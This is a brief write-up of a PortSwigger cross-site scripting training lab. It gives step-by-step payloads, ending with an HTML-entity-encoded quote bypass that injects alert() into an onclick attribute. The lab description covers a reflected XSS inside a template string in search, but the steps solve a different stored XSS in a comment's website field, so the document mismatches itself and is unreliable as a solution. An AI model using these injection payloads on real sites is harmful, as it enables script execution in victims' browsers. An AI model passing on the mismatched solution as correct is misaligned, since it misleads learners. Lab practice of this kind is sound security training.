https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.


1) write a comment on a post and see that website input is reflected into an href and also into the value of the attribute onclick of this <a> tag
    <a id="author" href="http://hello.com" onclick="var tracker={track(){}};tracker.track('http://hello.com');">aaa</a>

2) try to break it inserting '-alert()-'
    BUT ' are escaped into \
    
    <a id="author" href="http://helllo.com\'-alert()-\'" onclick="var tracker={track(){}};tracker.track('http://helllo.com\'-alert()-\'');">hello</a>


3) so try to escape them with \'-alert()-\'  but it doesn't work

4) try &apos; to encode ' in html encoding

    &apos;-alert()-&apos;

    it works

5) when we click on the link of the author of the comment the alert is opened
